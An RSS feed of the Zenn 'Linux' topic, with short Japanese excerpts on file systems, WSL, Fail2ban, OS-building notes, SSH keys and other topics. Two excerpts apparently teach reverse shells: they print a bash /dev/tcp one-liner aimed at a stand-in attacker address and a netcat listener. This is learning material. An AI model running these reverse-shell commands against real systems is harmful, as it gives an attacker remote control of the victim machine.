@@ -1,0 +1,239 @@
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Zennの「Linux」のフィード]]></title><description><![CDATA[Zennのトピック「Linux」のRSSフィードです]]></description><link>https://zenn.dev/topics/linux</link><image><url>https://storage.googleapis.com/zenn-user-upload/topics/860a9eb1e4.png</url><title>Zennの「Linux」のフィード</title><link>https://zenn.dev/topics/linux</link></image><generator>zenn.dev</generator><lastBuildDate>Fri, 16 May 2025 09:00:08 GMT</lastBuildDate><atom:link href="https://zenn.dev/topics/linux/feed" rel="self" type="application/rss+xml"/><language><![CDATA[ja]]></language><item><title><![CDATA[ファイルシステムについて]]></title><description><![CDATA[
+ はじめに
+お疲れ様です。新卒1年目の新米インフラエンジニアです。
+今回は、LinuxやWindowsのファイルシステムについてまとめてみることにしました。
+例えば、64GBのUSBメモリを買いましたが、Windowsのファイルエクスプローラーから確認したら64GBありませんでしたとなった時に原因の一つとして考えられるのが、ファイルシステムの都合です。ファイルシステムでの捉え方が違うため、必ずしも64GBとなるとは限りません。
+そんなファイルシステムについてわからない時があるので復習しておこうと思います。
+
+
+ Linuxのファイルシステム
+
+ ext4
+現在Linuxのファイルシステ...]]></description><link>https://zenn.dev/greenwolfenrir/articles/edfb6a903f1f81</link><guid isPermaLink="true">https://zenn.dev/greenwolfenrir/articles/edfb6a903f1f81</guid><pubDate>Fri, 16 May 2025 04:30:01 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--3_agOTLV--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E3%2582%25B7%25E3%2582%25B9%25E3%2583%2586%25E3%2583%25A0%25E3%2581%25AB%25E3%2581%25A4%25E3%2581%2584%25E3%2581%25A6%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Creeper%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzA3M2ZiYWU3OGQuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Creeper</dc:creator></item><item><title><![CDATA[リバースシェルを使いやすくする云々]]></title><description><![CDATA[bash -i &gt;&amp; /dev/tcp/攻撃者のipアドレス/ポート番号 0&gt;&amp;1
+で
+netcat -lvnp 4242
+のようなリバースシェルでは、↑キーを押しても ^[[A のような文字が出るし、タブキーを押してもディレクトリの補完をしてくれないから使いにくい。
+このような現象(ダムシェル)を回避するための試行錯誤。
+参考: https://www.amazon.co.jp/dp/4798174572
+
+ ダムシェルを修正する一連の流れ
+Aを被攻撃者のマシン、Bを攻撃者のマシンとする。
+
+リバースシェルの接続
+
+
+
+bash -c 'bash -i &g...]]></description><link>https://zenn.dev/tttttttttt/articles/84aaa8b9c8fb53</link><guid isPermaLink="true">https://zenn.dev/tttttttttt/articles/84aaa8b9c8fb53</guid><pubDate>Thu, 15 May 2025 13:10:21 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--fwhU7iZh--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2583%25AA%25E3%2583%2590%25E3%2583%25BC%25E3%2582%25B9%25E3%2582%25B7%25E3%2582%25A7%25E3%2583%25AB%25E3%2582%2592%25E4%25BD%25BF%25E3%2581%2584%25E3%2582%2584%25E3%2581%2599%25E3%2581%258F%25E3%2581%2599%25E3%2582%258B%25E4%25BA%2591%25E3%2580%2585%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:tttttttttt%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2IxZTcyNjQ1MWMuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>tttttttttt</dc:creator></item><item><title><![CDATA[ゼロからのOS自作入門 メモ (Day4)]]></title><description><![CDATA[こんにちは、kaiwareです。
+みかん本Day4(第4章)について、各種用語や詰まった箇所のメモを残す。
+前回はこちら。
+https://zenn.dev/kaiware0x/articles/mikan-osbook-day3
+
+ CプログラムからC++関数を呼び出す
+参照を受け取るC++関数をCプログラムから呼び出す際には、C側ではポインタ渡しをすれば良い。
+これはコンパイラの仕様で決まっている。
+今回の場合、こちらの仕様に準拠している：System V AMD64 ABI
+
+ 配置new
+
+通常のnewはインスタンスをヒープ領域に確保する
+
+プログラマがメモリ領域の指定はできず、...]]></description><link>https://zenn.dev/kaiware0x/articles/mikan-osbook-day4</link><guid isPermaLink="true">https://zenn.dev/kaiware0x/articles/mikan-osbook-day4</guid><pubDate>Thu, 15 May 2025 10:00:37 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--vf9g4p-q--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2582%25BC%25E3%2583%25AD%25E3%2581%258B%25E3%2582%2589%25E3%2581%25AEOS%25E8%2587%25AA%25E4%25BD%259C%25E5%2585%25A5%25E9%2596%2580%2520%25E3%2583%25A1%25E3%2583%25A2%2520%2528Day4%2529%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:kaiware%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzFjYTA3YzUyOTcuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>kaiware</dc:creator></item><item><title><![CDATA[エクスプローラーでLinuxのペンギンが消えた。そして、エクスプローラーにピン止めしたファイルも開けなくなった。]]></title><description><![CDATA[
+ 初めに
+いつの間にか、エクスプローラーからLinuxのペンギンがいなくなっていた。
+そして、エクスプローラーのクイックアクセスにピン止めしておいたubuntu上のファイルもしたのように、アクセスできなくなった。
+
+
+ 結論
+wslの更新をしよう！！
+下のコードで更新できる。
+wsl --update
+ペンギンが返ってきました。
+
+私の場合は、wslを入れたっきり、定期更新をするのをすっかり忘れていた。
+
+ 参考文献
+https://note.com/astrobutsurist/n/n4e4f2ffe982f
+https://learn.microsoft.com/ja-jp/win...]]></description><link>https://zenn.dev/enbipaipu/articles/cffbc975e536ee</link><guid isPermaLink="true">https://zenn.dev/enbipaipu/articles/cffbc975e536ee</guid><pubDate>Wed, 14 May 2025 14:19:58 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--rBlMZO7K--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2582%25A8%25E3%2582%25AF%25E3%2582%25B9%25E3%2583%2597%25E3%2583%25AD%25E3%2583%25BC%25E3%2583%25A9%25E3%2583%25BC%25E3%2581%25A7Linux%25E3%2581%25AE%25E3%2583%259A%25E3%2583%25B3%25E3%2582%25AE%25E3%2583%25B3%25E3%2581%258C%25E6%25B6%2588%25E3%2581%2588%25E3%2581%259F%25E3%2580%2582%25E3%2581%259D%25E3%2581%2597%25E3%2581%25A6%25E3%2580%2581%25E3%2582%25A8%25E3%2582%25AF%25E3%2582%25B9%25E3%2583%2597%25E3%2583%25AD%25E3%2583%25BC%25E3%2583%25A9%25E3%2583%25BC%25E3%2581%25AB%25E3%2583%2594%25E3%2583%25B3%25E6%25AD%25A2%25E3%2582%2581%25E3%2581%2597%25E3%2581%259F%25E3%2583%2595%25E3%2582%25A1%25E3%2582%25A4%25E3%2583%25AB%25E3%2582%2582%25E9%2596%258B%25E3%2581%2591%25E3%2581%25AA%25E3%2581%258F%25E3%2581%25AA%25E3%2581%25A3%25E3%2581%259F%25E3%2580%2582%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E3%2581%25AF%25E3%2582%258B%25E3%2581%258D%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jSWZIU3dhcTdVSS03OUxfLU90UDR2M3FuRmtQVXd6RkRldmJpNVBfN0k2VEE9czk2LWM=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>はるき</dc:creator></item><item><title><![CDATA[うさぎでもわかるFail2ban入門 🐰 サーバーを守る番うさぎ]]></title><description><![CDATA[
+ うさぎでもわかるFail2ban入門 🐰 サーバーを守る番うさぎ
+👇️PodCastでも聴けます
+https://youtu.be/m-bZlDC4-to
+こんにちは！テックブログを毎日発信している🐰です。今日は初めて知った「Fail2ban（フェイルトゥーバン）」について、うさぎでも分かるように説明しますね！
+あなたのサーバーに悪いうさぎ（攻撃者）が何度も間違ったパスワードでログインしようとしたら...困りますよね？そんな時、Fail2banが自動で悪いうさぎをブロックしてくれるんです！まるでサーバーの番うさぎみたい🐰
+うさぎの経験では、最初は「不正アクセスって怖いな...」と思っ...]]></description><link>https://zenn.dev/taku_sid/articles/20250513_fail2ban</link><guid isPermaLink="true">https://zenn.dev/taku_sid/articles/20250513_fail2ban</guid><pubDate>Tue, 13 May 2025 08:55:25 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--ZrCTSvYw--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2581%2586%25E3%2581%2595%25E3%2581%258E%25E3%2581%25A7%25E3%2582%2582%25E3%2582%258F%25E3%2581%258B%25E3%2582%258BFail2ban%25E5%2585%25A5%25E9%2596%2580%2520%2520%2520%25E3%2582%25B5%25E3%2583%25BC%25E3%2583%2590%25E3%2583%25BC%25E3%2582%2592%25E5%25AE%2588%25E3%2582%258B%25E7%2595%25AA%25E3%2581%2586%25E3%2581%2595%25E3%2581%258E%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:taku_sid%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jTFFIVERiOTUwakhtTUJlendZR0RaeHlPX290RnJISktCY2ZYUFFuY1dVVGNGRkd1d3A9czk2LWM=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>taku_sid</dc:creator></item><item><title><![CDATA[Kubuntuバージョン間の差異]]></title><description><![CDATA[自分用に調べたことをまとめておきます。
+UbuntuのフレイバーにはLTS版と通常（暫定）版があり、一般ユーザーにはLTSの使用が推奨されています。一方で、通常版は新しい分LTSよりも機能やハードウェアへの対応が追加されていることが多いです。これらが自分のハードウェアに関するものであれば、通常版を使いたくなりもします。
+以下は、自分用に調べたKubuntuのバージョン間の差異です。これらはラップトップPC向けの機能に焦点を絞り、GUIによる設定が可能か否かを調べたものです。
+
+ハードウェア： Fujitsu FMV Lifebook U939
+情報は2024年5月12日現在
+
+
+
+
+項目...]]></description><link>https://zenn.dev/seiichihorie/articles/20250512-kubuntu-versions</link><guid isPermaLink="true">https://zenn.dev/seiichihorie/articles/20250512-kubuntu-versions</guid><pubDate>Mon, 12 May 2025 13:12:08 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--urcdM9cA--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:Kubuntu%25E3%2583%2590%25E3%2583%25BC%25E3%2582%25B8%25E3%2583%25A7%25E3%2583%25B3%25E9%2596%2593%25E3%2581%25AE%25E5%25B7%25AE%25E7%2595%25B0%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:%25E5%25A0%2580%25E6%25B1%259F%25E8%25AA%25A0%25E4%25B8%2580%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jS3hveFBEMG4wNVZyT182d0hPbUpld1BTOTdVOE1Hdzg0R09IY1A5Tm1ETmk0N1V0QWZTQT1zOTYtYw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>堀江誠一</dc:creator></item><item><title><![CDATA[私がエンジニアになった経緯]]></title><description><![CDATA[
+ 私がインフラエンジニアになった経緯
+テックブログを書き始める前に私がインフラエンジニアになった経緯を大学時代から遡って紹介させてください。
+今、就活で悩んでる学生や転職で悩んでいる社会人の方に向けて書いてみました。
+時間があれば、是非読んでみて下さい。
+
+ 「好き」から始まったフツーの大学生時代
+僕は26歳、文系私立大学でファッションを楽しむ毎日を送っていた。授業と言えば好きな服を着るための口実に過ぎず、学びより街を歩くワクワクのほうが大きかった。
+
+ 就活という現実に直面
+大学3年の春、周囲が就活ムードに突入する中、自分には何の軸もないことに気づく。「服が好き」だけじゃこの先を描け...]]></description><link>https://zenn.dev/kasumi98/articles/6e9732311cb13d</link><guid isPermaLink="true">https://zenn.dev/kasumi98/articles/6e9732311cb13d</guid><pubDate>Sun, 11 May 2025 12:55:06 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--q9ypfVsb--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E7%25A7%2581%25E3%2581%258C%25E3%2582%25A8%25E3%2583%25B3%25E3%2582%25B8%25E3%2583%258B%25E3%2582%25A2%25E3%2581%25AB%25E3%2581%25AA%25E3%2581%25A3%25E3%2581%259F%25E7%25B5%258C%25E7%25B7%25AF%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:kasumi98%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tL2EvQUNnOG9jTDgzZW0xZUZKM2VPNm5SR0VqVU5DVnFqRjRvcmdfdUNXRHUzek9hVzQxYzQ5ZW1sWTU9czk2LWM=%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>kasumi98</dc:creator></item><item><title><![CDATA[apt-checkが中々終わらないのを改善した]]></title><description><![CDATA[計算を走らせているとaptが中々終わらない現象が起きていた。
+原因としては apt-check のnice値が19に設定されているためであった。
+19はやりすぎだと思われるので以下のように10に変更した。
+
+/usr/lib/update-notifier/apt_check.py
+--- apt_check.py.bak    2025-05-11 19:45:04.088877117 +0900
++++ apt_check.py        2025-05-11 19:44:49.450300693 +0900
+@@ -364,7 +364,7 @@ def get_apt_pkg...]]></description><link>https://zenn.dev/toru3/articles/0943fcac7df524</link><guid isPermaLink="true">https://zenn.dev/toru3/articles/0943fcac7df524</guid><pubDate>Sun, 11 May 2025 10:50:58 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--eFRS7ij4--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:apt-check%25E3%2581%258C%25E4%25B8%25AD%25E3%2580%2585%25E7%25B5%2582%25E3%2582%258F%25E3%2582%2589%25E3%2581%25AA%25E3%2581%2584%25E3%2581%25AE%25E3%2582%2592%25E6%2594%25B9%25E5%2596%2584%25E3%2581%2597%25E3%2581%259F%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Toru3%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzI0YzQwY2I5MjguanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Toru3</dc:creator></item><item><title><![CDATA[ゼロからのOS自作入門 メモ (Day3)]]></title><description><![CDATA[こんにちは、kaiwareです。
+みかん本Day3(第3章)について、各種用語や詰まった箇所のメモを残す。
+前回はこちら。
+https://zenn.dev/kaiware0x/articles/mikan-osbook-day2
+
+ レジスタ Register
+レジスタとは、値を登録しておく記憶領域。CPUの内部にある。
+QEMUで起動中端末のレジスタ値を確認できる：
+(qemu) info registers
+RAX=0000000000000000 RBX=0000000000000001 RCX=000000003fb7b1c0 RDX=0000000000000031
+RSI=...]]></description><link>https://zenn.dev/kaiware0x/articles/mikan-osbook-day3</link><guid isPermaLink="true">https://zenn.dev/kaiware0x/articles/mikan-osbook-day3</guid><pubDate>Sun, 11 May 2025 10:35:55 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--hustcRmc--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2582%25BC%25E3%2583%25AD%25E3%2581%258B%25E3%2582%2589%25E3%2581%25AEOS%25E8%2587%25AA%25E4%25BD%259C%25E5%2585%25A5%25E9%2596%2580%2520%25E3%2583%25A1%25E3%2583%25A2%2520%2528Day3%2529%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:kaiware%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzFjYTA3YzUyOTcuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>kaiware</dc:creator></item><item><title><![CDATA[ゼロからのOS自作入門 メモ (Day2)]]></title><description><![CDATA[こんにちは、kaiwareです。
+みかん本Day2(第2章)について、各種用語や詰まった箇所のメモを残す。
+前回はこちら。
+https://zenn.dev/kaiware0x/articles/mikan-osbook-day1-2
+
+ EDK II (EDK2)
+
+UEFIとその周辺のプログラムの開発キット
+もともとIntel主導で開発されていた
+OSS
+
+https://github.com/tianocore/edk2
+
+
+MdePkg
+
+以下のヘッダを提供する
+
+#include &lt;Uefi.h&gt;
+#include &lt;Library/Uefi.h&gt;
+
+
+...]]></description><link>https://zenn.dev/kaiware0x/articles/mikan-osbook-day2</link><guid isPermaLink="true">https://zenn.dev/kaiware0x/articles/mikan-osbook-day2</guid><pubDate>Sat, 10 May 2025 12:36:33 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--zsWQ0Irm--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2582%25BC%25E3%2583%25AD%25E3%2581%258B%25E3%2582%2589%25E3%2581%25AEOS%25E8%2587%25AA%25E4%25BD%259C%25E5%2585%25A5%25E9%2596%2580%2520%25E3%2583%25A1%25E3%2583%25A2%2520%2528Day2%2529%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:kaiware%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzFjYTA3YzUyOTcuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>kaiware</dc:creator></item><item><title><![CDATA[VOICEVOX Core v0.16.0 で俳句読み上げ動画を作る]]></title><description><![CDATA[
+ はじめに
+前回の記事（VOICEVOX Core を Python で扱う基本）では、VOICEVOX Core の Python バインディングを使って、テキストから音声を生成する方法を紹介しました。今回はその続編として、5・7・5 の俳句をずんだもんに読み上げてもらい、背景画像とともに動画を生成する CLI ベースのワークフローを紹介します。
+なお、使用するバージョンは VOICEVOX Core v0.16.0 です。開発版では非同期処理の仕様変更が進んでいるため、安定したバージョンでの確認が目的です。
+
+ 必要なツールのインストール
+
+ ディレクトリ構成（v0.16.0 想定...]]></description><link>https://zenn.dev/masakielastic/articles/aaf1b67ce37b56</link><guid isPermaLink="true">https://zenn.dev/masakielastic/articles/aaf1b67ce37b56</guid><pubDate>Sat, 10 May 2025 11:45:14 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--YV7pb_jV--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:VOICEVOX%2520Core%2520v0.16.0%2520%25E3%2581%25A7%25E4%25BF%25B3%25E5%258F%25A5%25E8%25AA%25AD%25E3%2581%25BF%25E4%25B8%258A%25E3%2581%2592%25E5%258B%2595%25E7%2594%25BB%25E3%2582%2592%25E4%25BD%259C%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Masaki%2520Kagaya%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzc3ODAxZTNiZTAuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Masaki Kagaya</dc:creator></item><item><title><![CDATA[ssh公開鍵認証時の設定]]></title><description><![CDATA[
+ はじめに
+たまにssh公開鍵認証を設定するのですが、ssh接続先マシンへの公開鍵を登録する方法を忘れます。
+なので、備忘録用にメモしておきます。
+
+ ssh鍵作成
+ssh鍵の作成は下記コマンで作成します。
+オプションを指定しないとインタラクティブにファイルパスなどを聞かれますが、めんどくさいのでコマンドでやります。
+ssh-keygen -t rsa -b 4096 -C "your_email@example.com" -f ~/.ssh/id_test_rsa
+[オプション]
+-t：暗号アルゴリズム。デフォルトはrsaのようですが、現在はed25519が推奨のようです。
+-b：作...]]></description><link>https://zenn.dev/rihito/articles/a8a0967a69cab9</link><guid isPermaLink="true">https://zenn.dev/rihito/articles/a8a0967a69cab9</guid><pubDate>Sat, 10 May 2025 07:20:34 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--GII5Vmso--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:ssh%25E5%2585%25AC%25E9%2596%258B%25E9%258D%25B5%25E8%25AA%258D%25E8%25A8%25BC%25E6%2599%2582%25E3%2581%25AE%25E8%25A8%25AD%25E5%25AE%259A%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:kichi%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2ZhZjBjYjJiOWYuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>kichi</dc:creator></item><item><title><![CDATA[bash -i >& /dev/tcp/attacker_ip/4444 0>&1の解釈]]></title><description><![CDATA[リバースシェルの構文について1週間くらい悩んでいたのでメモ。
+
+bash -i
+
+対話形式(-i)のbashを起動
+
+コマンド &gt;&amp; ファイル名
+
+Aの標準出力と標準エラー出力をBに送る。
+!
+コマンド &gt;&amp; ファイル名とあるが、コマンド 1&gt;ファイル名 2&gt;&amp;1と同義。コマンド &amp;&gt; ファイル名でも可
+なお2&gt;&amp;1のようなリダイレクトは、2, &gt;&amp;, 1に分解できるようなものではなく、2&gt;&amp;1で一つの塊なので注意。分解できる前提で考えるとコマンド &gt;&amp; ファイル名の&g...]]></description><link>https://zenn.dev/tttttttttt/articles/54cdfd7c537c51</link><guid isPermaLink="true">https://zenn.dev/tttttttttt/articles/54cdfd7c537c51</guid><pubDate>Fri, 09 May 2025 14:13:53 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--xBxTzKbt--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252Fattacker_ip%252F4444%25200%253E%25261%25E3%2581%25AE%25E8%25A7%25A3%25E9%2587%2588%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:tttttttttt%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyL2IxZTcyNjQ1MWMuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>tttttttttt</dc:creator></item><item><title><![CDATA[【実行厳禁】絶対に実行してはいけないLinuxコマンド]]></title><description><![CDATA[
+ はじめに
+お疲れ様です。新卒1年目の新米インフラエンジニアです。
+私はまだサーバー方面について詳しくありませんが、実習や本番環境などで誤って実行しないよう、ブログにすることで、絶対に実行してはいけないLinuxコマンドを復習しておこうと思いました。
+
+
+ Linuxとは？
+参考程度にRedHat社の記事を参照してみます。
+
+
+Linuxは、1991 年に Linus Torvalds 氏によって作成されたオープンソースのオペレーティングシステム (OS) です。
+
+
+と書いてあります。
+言うまでもありませんが、OSは基本ソフトウェアのことで、PCやスマホを動かすために必要となるソフト...]]></description><link>https://zenn.dev/greenwolfenrir/articles/51267e6a5cdd17</link><guid isPermaLink="true">https://zenn.dev/greenwolfenrir/articles/51267e6a5cdd17</guid><pubDate>Fri, 09 May 2025 07:21:40 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--VTSZ09Sr--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:%25E3%2580%2590%25E5%25AE%259F%25E8%25A1%258C%25E5%258E%25B3%25E7%25A6%2581%25E3%2580%2591%25E7%25B5%25B6%25E5%25AF%25BE%25E3%2581%25AB%25E5%25AE%259F%25E8%25A1%258C%25E3%2581%2597%25E3%2581%25A6%25E3%2581%25AF%25E3%2581%2584%25E3%2581%2591%25E3%2581%25AA%25E3%2581%2584Linux%25E3%2582%25B3%25E3%2583%259E%25E3%2583%25B3%25E3%2583%2589%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Creeper%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzA3M2ZiYWU3OGQuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Creeper</dc:creator></item><item><title><![CDATA[VOICEVOX Core で「ずんだもん」の音声を最小構成で合成する]]></title><description><![CDATA[
+ 概要
+このチュートリアルでは、VOICEVOX Core 0.16.0（安定版）を使って「ずんだもん」の音声を合成する最小構成手順を解説します。この記事は ChatGPT によって生成されました。
+
+PyPI から公式の Python バインディングをインストール
+
+run.py を GitHub から取得して使用
+非同期処理（asyncio）は使わず、簡潔に動作確認を行います
+
+
+
+ ステップ 1：Downloader の入手
+プロジェクトディレクトリを作成し、移動します。
+mkdir project
+cd project
+リポジトリから Downloader を入手します。
+cu...]]></description><link>https://zenn.dev/masakielastic/articles/23c5850e30c2fa</link><guid isPermaLink="true">https://zenn.dev/masakielastic/articles/23c5850e30c2fa</guid><pubDate>Fri, 09 May 2025 02:44:28 GMT</pubDate><enclosure url="https://res.cloudinary.com/zenn/image/upload/s--9w9avkR7--/c_fit%2Cg_north_west%2Cl_text:notosansjp-medium.otf_55:VOICEVOX%2520Core%2520%25E3%2581%25A7%25E3%2580%258C%25E3%2581%259A%25E3%2582%2593%25E3%2581%25A0%25E3%2582%2582%25E3%2582%2593%25E3%2580%258D%25E3%2581%25AE%25E9%259F%25B3%25E5%25A3%25B0%25E3%2582%2592%25E6%259C%2580%25E5%25B0%258F%25E6%25A7%258B%25E6%2588%2590%25E3%2581%25A7%25E5%2590%2588%25E6%2588%2590%25E3%2581%2599%25E3%2582%258B%2Cw_1010%2Cx_90%2Cy_100/g_south_west%2Cl_text:notosansjp-medium.otf_37:Masaki%2520Kagaya%2Cx_203%2Cy_121/g_south_west%2Ch_90%2Cl_fetch:aHR0cHM6Ly9zdG9yYWdlLmdvb2dsZWFwaXMuY29tL3plbm4tdXNlci11cGxvYWQvYXZhdGFyLzc3ODAxZTNiZTAuanBlZw==%2Cr_max%2Cw_90%2Cx_87%2Cy_95/v1627283836/default/og-base-w1200-v2.png" length="0" type="image/png"/><dc:creator>Masaki Kagaya</dc:creator></item><item><title><![CDATA[Chuwi Minibook X をUbuntu Budgieで開発マシンに仕立てる]]></title><description><![CDATA[
+ 背景
+かねてより、持ち運びが容易でソフトウェア開発にも使えるコンパクトなマシンが欲しいと考えていました。これまで何度か誰もが夢見る「iPadとキーボード」の組み合わせを試してきましたが、残念ながら本格的な開発環境としては満足のいくものではありませんでした。
+そんな中、小型でありながらPCとしての機能を備えた「Chuwi Minibook X」という選択肢を見つけ、購入しました。
